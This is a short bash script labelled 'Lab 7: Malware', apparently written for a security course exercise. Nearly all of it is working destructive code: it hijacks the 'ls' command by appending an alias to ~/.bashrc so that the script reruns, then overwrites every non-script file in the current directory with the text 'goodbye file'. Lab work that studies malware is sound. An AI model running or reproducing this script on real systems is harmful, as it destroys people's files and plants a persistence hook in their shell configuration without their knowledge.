#! /usr/bin/env bash

# Lab 7: Malware
# Goal: overwrite files

# View ~/.bashrc to see current aliases. If we haven't already created an alias 
# to execute our malware script, then add this alias to further propagate.
# aliasToMatch = alias to set if nonexistent
# currentLastAlias = last alias/line currently in ~/.bashrc

# update aliasToMatch to the path to this script
aliasToMatch="alias ls='~/Downloads/script.sh'"
currentLastLine=$(cat ~/.bashrc | tail -n 1)
if [ "$currentLastLine" != "$aliasToMatch" ]; then
	echo "$aliasToMatch" >> ~/.bashrc
	source ~/.bashrc
fi

# resource ./bashrc every time script is run just in case
source ~/.bashrc

# List files before altering
ls

# Load files into an array
filearray=($(ls | grep -Ev "script[[:digit:]]*\.sh"))

# Loop through file array and overwrite files
for key in ${!filearray[@]}
do
	echo "goodbye file" > ${filearray[$key]}
done



